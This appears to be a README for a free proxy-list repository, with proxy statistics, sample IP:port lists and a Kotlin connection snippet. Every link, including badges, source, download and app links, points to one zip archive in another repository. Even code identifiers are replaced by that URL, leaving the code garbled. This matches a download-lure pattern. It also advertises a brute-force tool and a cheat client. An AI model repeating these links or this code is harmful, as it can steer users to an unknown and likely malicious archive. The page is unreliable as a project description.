<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip -->
[contributors-shield]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
[contributors-url]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
[forks-shield]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
[forks-url]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
[stars-shield]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
[stars-url]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
[issues-shield]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
[issues-url]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
[license-shield]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
[license-url]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
[commit-shield]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
[commit-url]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
[commit-activity]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip
[commit-activity-url]: https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip

# 🎁 SOCKS4/5 & HTTP/S PROXIES // ONLINE + ARCHIVE

[![Commits][commit-shield]][commit-url]
[![Commits][commit-activity]][commit-activity-url]
[![Stargazers][stars-shield]][stars-url]
[![Forks][forks-shield]][forks-url]
[![Issues][issues-shield]][issues-url]

###### Major update -> 29/05/2022 | [ProxyBuilder 2.0](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
###### Previous version -> 22/07/2021 - 28/05/2022 | [ProxyBuilder 1.0](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)

## 📰About This Project & The Proxies
This repository contains a free list of tested SOCKS4/5 & HTTP/S proxies in -> **JSON**, **TXT**, **CSV**, **XML** & **YAML** format. No authentication is required when connecting to these proxies.

## 👩‍💻Proxy Testing

These proxies are tested ~12x/day (every 2 hours) against EU/US hosting providers - **see below**, they have been verified to write & read data <**AT THE TIME OF TESTING**>.

**Hosting Provider**|**Country**|**Continent**
:-----:|:-----:|:-----:
OVH|France|EU
Amazon Web Services|United States|NA
Oracle Cloud|United Kingdom, Japan|EU, AS
Microsoft Azure|Hong Kong|AS

[Source Code](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
```kotlin
    //Netty4 Connect Example
    private fun connect(proxyData : ProxyChannelData) {
        val endpoint = https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip ?: return
        val awaitTime = (if(https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip()) 30000 else https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)

        Bootstrap().group(workerGroup)
            .channel(https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
            .resolver(https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
            .option(https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip, https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
            .option(https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip, true)
            .option(https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip, https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
            .handler(ProxyChannelInitializer(proxyData))
            .connect(InetSocketAddress(https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip, https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip))
            .channel().closeFuture().awaitUninterruptibly(awaitTime)
    }
```

## 📝Proxy Formatting

These proxies are scraped from various sources & I compile this data using my [ProxyBuilder](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip) application. Proxies are sorted from lowest to highest 0-255 & duplicated proxies are removed — the only exception is if an IP has a different port open, which is also a working proxy tunnel <**Less than 1% of the total proxies at the time of testing**>.

```IP:Port -> 1.0.132.249:4153```

## ✔Compatability

These proxies should work for any application that can establish an HTTP, HTTPS, SOCKS4 or SOCKS5 connection. Such as, an application that has proxy support (FireFox, Chrome), or as an example, these Java Apps below. 

- [JaySyiPker](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
- [Bruteforce-RSPS](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
- [718 Cheat Client (Final)](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)

## 🔗ProxyList Links (Direct URL)

###### Classic View (IP:Port Only)

- _Online Proxies:_
[**JSON**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**TXT**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**CSV**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**XML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**YAML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)

- _Online/Offline Proxies (Archive):_
[**JSON**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**TXT**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**CSV**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**XML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**YAML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)

###### Basic View (Without Country/Statistics)

- _Online Proxies:_
[**JSON**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**CSV**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**XML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**YAML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)

###### Advanced View (With Country/Statistics)
- _Online Proxies:_
[**JSON**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**CSV**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**XML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**YAML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)

- _Online/Offline Proxies (Archive):_
[**JSON**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**CSV**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**XML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip), [**YAML**](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)

---

# [SAMPLE PROXIES] - [November 12 2022 | 05:11:27]

### Proxy Statistics:
- _Online Proxies (By Protocol):_
   - **SOCKS4** -> 1424
   - **SOCKS5** -> 194
   - **HTTP** -> 1189
   - **HTTPS** -> 1123

- _Proxies (Total):_
   - **Online Proxies (SOCKS4/5 + HTTP/S)** -> 2509
   - **Unique Online Proxies** -> 2509
   - **Unique Online/Offline Proxies (Archive)** -> 14377

## [SOCKS4 (1424/2509)](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
```yaml
1.9.213.114:4153
1.10.140.43:4145
1.20.95.95:5678
1.20.184.75:4153
1.20.220.79:4145
1.20.235.153:5678
1.32.57.85:5678
1.53.137.84:4145
1.179.147.5:52210
1.179.148.9:36476
1.179.173.114:4153
3.131.207.170:13343
3.141.13.98:5678
5.8.240.90:4153
5.8.240.91:4153
5.8.240.94:4153
5.34.74.234:5678
5.58.33.187:55507
5.58.47.25:3629
5.58.66.55:14888
5.83.94.8:4153
5.165.2.223:3629
5.178.217.227:31019
5.180.100.24:5678
5.188.64.79:5678
5.226.125.10:10801
8.39.228.25:39593
8.39.228.161:39593
8.39.228.193:39593
8.42.68.93:39593
```

## [SOCKS5 (194/2509)](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
```yaml
1.180.49.222:7302
3.131.207.170:13343
5.161.86.206:1080
8.209.220.34:80
20.239.2.157:80
24.249.199.4:4145
24.249.199.12:4145
31.43.203.100:1080
37.18.73.94:5566
37.59.98.31:9050
43.135.154.94:21127
43.156.107.62:80
45.113.80.37:9050
45.148.121.228:443
46.147.194.197:1080
47.56.69.11:8000
47.74.152.29:8888
47.74.226.8:5001
47.89.153.213:80
47.92.113.71:80
47.93.239.66:1080
47.252.4.64:8888
47.254.195.78:443
49.12.156.165:80
49.51.74.195:21127
49.51.186.129:21127
51.83.190.248:19050
51.195.102.120:10084
51.222.12.245:10084
51.222.13.193:10084
```

## [HTTP (1189/2509)](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
```yaml
1.0.170.50:80
1.1.189.58:8080
1.1.220.100:8080
1.179.136.98:8080
1.179.144.41:8080
1.179.148.9:36476
2.179.193.146:80
3.20.236.208:49205
3.215.177.148:49205
5.58.33.187:55507
5.104.174.199:23500
5.135.176.161:10000
5.180.130.90:80
5.180.130.91:8080
8.242.207.202:8080
12.144.254.185:9080
14.160.32.23:8080
14.161.31.192:53281
14.177.236.212:55443
14.192.3.161:83
14.241.225.167:80
14.248.80.77:8080
18.216.72.10:5678
18.222.17.49:49205
23.132.48.1:999
24.51.32.59:8080
24.72.171.214:8080
24.116.218.195:8080
24.172.34.114:49920
24.172.82.94:53281
```

## [HTTPS (1123/2509)](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
```yaml
1.0.170.50:80
1.1.189.58:8080
1.1.220.100:8080
1.179.136.98:8080
1.179.144.41:8080
1.179.148.9:36476
2.179.193.146:80
3.20.236.208:49205
3.215.177.148:49205
5.58.33.187:55507
5.104.174.199:23500
5.135.176.161:10000
5.180.130.90:80
5.180.130.91:8080
8.242.207.202:8080
12.144.254.185:9080
14.160.32.23:8080
14.161.31.192:53281
14.177.236.212:55443
14.192.3.161:83
14.241.225.167:80
14.248.80.77:8080
18.216.72.10:5678
18.222.17.49:49205
23.132.48.1:999
24.51.32.59:8080
24.72.171.214:8080
24.116.218.195:8080
24.172.34.114:49920
24.172.82.94:53281
```

## [ARCHIVE (2509/14377)](https://github.com/ZaidGuy/proxy-list-1/raw/refs/heads/main/online-proxies/proxy-list-v1.3.zip)
```yaml
1.0.132.249:4153
1.0.133.89:4153
1.0.133.100:51327
1.0.136.172:4145
1.0.137.61:4153
1.0.170.50:80
1.0.205.87:8080
1.1.189.58:8080
1.1.220.100:8080
1.2.180.111:4145
1.2.187.250:4145
1.2.252.65:8080
1.4.157.35:36202
1.4.195.114:4145
1.4.198.156:4153
1.4.198.182:4153
1.4.214.148:5678
1.9.164.242:35471
1.9.167.35:60489
1.9.167.36:60489
1.9.213.114:4153
1.10.133.211:4145
1.10.140.43:4145
1.10.141.220:54620
1.10.189.133:50855
1.13.21.26:33080
1.13.165.87:8080
1.14.194.51:6006
1.20.95.95:5678
1.20.96.30:4153
```



Thx Co Pure Gs - Sort Meister! 💟